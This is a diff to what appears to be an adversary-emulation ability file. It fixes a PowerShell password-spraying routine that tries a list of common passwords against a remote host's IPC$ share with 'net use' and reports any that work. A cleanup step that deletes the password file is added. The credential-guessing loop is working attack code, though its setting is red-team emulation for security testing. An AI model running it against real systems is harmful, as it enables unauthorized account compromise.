@@ -18,10 +18,12 @@
           echo Spring2022 >> passwords.txt;
           echo ChangeMe! >> passwords.txt;
           foreach($passw in Get-Content ".\passwords.txt") {
-            net use '#{remote.host.fqdn}\IPC$' /user:"$env:USERDNSDOMAIN\$env:USERNAME" "$passw" 1>$null 2>&1;
+            net use '\\#{remote.host.fqdn}\IPC$' /user:"$env:USERDNSDOMAIN\$env:USERNAME" "$passw" 1>$null 2>&1;
             if ($?) {
               echo [*] "$env:USERNAME : $passw";
-              net use /delete '#{remote.host.fqdn}\IPC$' > $null;
+              net use /delete '\\#{remote.host.fqdn}\IPC$';
               break;
             }
           }
+        cleanup: |
+          rm passwords.txt -force
